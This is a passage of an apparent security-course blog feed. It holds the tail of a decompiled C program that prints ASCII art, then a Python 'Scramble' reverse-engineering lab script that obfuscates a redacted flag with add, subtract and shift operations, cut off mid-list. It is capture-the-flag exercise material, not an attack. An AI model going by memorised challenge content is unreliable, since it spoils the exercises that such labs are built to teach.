░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░░░░░░░░ \x00\x00 ░░ "); puts(&amp;icon[6760]); return 0LL; } :::</description></item><item><title>Simple Reverse - 0x27(2023 Lab - Scramble)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/index.html</guid><description>Simple Reverse - 0x27(2023 Lab - Scramble) Source code :::spoiler scramble.py
import random def generate_scramble_pattern(pattern_length, max_shift, max_add_sub): scramble_pattern = [] for _ in range(random.randint(1, pattern_length)): operation = random.randint(0, 3) if operation == 0: sub_value = random.randint(1, max_add_sub) elif operation == 1: add_value = random.randint(1, max_add_sub) scramble_pattern.append(('add', add_value)) elif operation == 2: sub_value = random.randint(1, max_add_sub) scramble_pattern.append(('sub', sub_value)) elif operation == 3: shift_value = random.randint(1, max_shift) scramble_pattern.append(('lsh', shift_value)) return scramble_pattern def apply_scramble_pattern(input_bytes, patterns): result = [] for i, operations in enumerate(patterns): src = input_bytes[i] for operation in operations: if operation is None: continue elif operation[0] == 'add': src += operation[1] elif operation[0] == 'sub': src -= operation[1] elif operation[0] == 'lsh': src &lt;&lt;= operation[1] src &amp;= 0xffffffff result.append(src) return result k_FLAG = b'FLAG{REDACTED}' patterns = [generate_scramble_pattern(6, max_shift=10, max_add_sub=0xffff) for i in range(len(k_FLAG)) ] scrambled_result = apply_scramble_pattern(k_FLAG, patterns) print("Input Bytes:", k_FLAG, len(k_FLAG)) # REDACTED, 42 print("Scramble Pattern:", patterns) # [[('sub', 20935)], [('sub', 31575), ('lsh', 9), ('add', 45363), ('add', 35372), ('sub', 15465)], [('add', 19123), ('add', 35260), ('sub', 49421), ('lsh', 8)], [('lsh', 1), ('sub', 4977), ('sub', 55837)], [('add', 16937)], [('sub', 56984), ('lsh', 2), ('sub', 32363), ('sub', 46293)], [('sub', 94), ('sub', 48860), ('sub', 18342), ('lsh', 3)], [('add', 37549), ('sub', 36283), ('lsh', 6), ('add', 6253)], [('add', 34661), ('sub', 13281), ('sub', 64107)], [('sub', 8525), ('sub', 30349), ('sub', 26744)], [('lsh', 2), ('sub', 18120), ('sub', 63091), ('add', 17287), ('sub', 37618), ('add', 2237)], [('sub', 48573), ('sub', 4449), ('add', 36013), ('sub', 64051)], [('add', 10415), ('lsh', 3), ('lsh', 10)], [('add', 5676), ('lsh', 3), ('lsh', 10), ('add', 32002), ('sub', 60775)], [('add', 35939), ('sub', 32666), ('sub', 45639), ('add', 2077), ('sub', 16253)], [('sub', 30392), ('sub', 26913), ('sub', 14009), ('sub', 62416)], [('sub', 15056), ('sub', 40527)], [('lsh', 5)], [('lsh', 1), ('sub', 16070)], [('add', 2045)], [('lsh', 8), ('add', 37087), ('sub', 22013), ('lsh', 10), ('lsh', 2)], [('add', 31880), ('sub', 56557), ('lsh', 6), ('lsh', 5), ('lsh', 8), ('add', 15535)], [('add', 22937), ('add', 4060)], [('add', 8462), ('sub', 4463), ('sub', 45810), ('lsh', 